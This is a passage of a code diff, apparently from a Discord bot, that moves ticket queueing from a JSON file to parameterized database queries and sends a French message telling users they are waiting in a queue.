-                        fs.writeFileSync(TICKETS_FILE, JSON.stringify(data, null, 2));
+                    const res = await db.query('SELECT 1 FROM ticket_queue WHERE user_id = $1', [interaction.user.id]);
+                    if (res.rows.length === 0) {
+                        await db.query(
+                            'INSERT INTO ticket_queue (user_id, type, timestamp) VALUES ($1, $2, $3)',
+                            [interaction.user.id, type, Date.now()]
+                        );
                     }
                     return await interaction.reply({ 
                         content: '⚠️ Notre équipe rencontre actuellement une forte affluence. Vous avez été placé en file d\'attente. Vous recevrez un message privé dès que votre ticket sera créé.', 
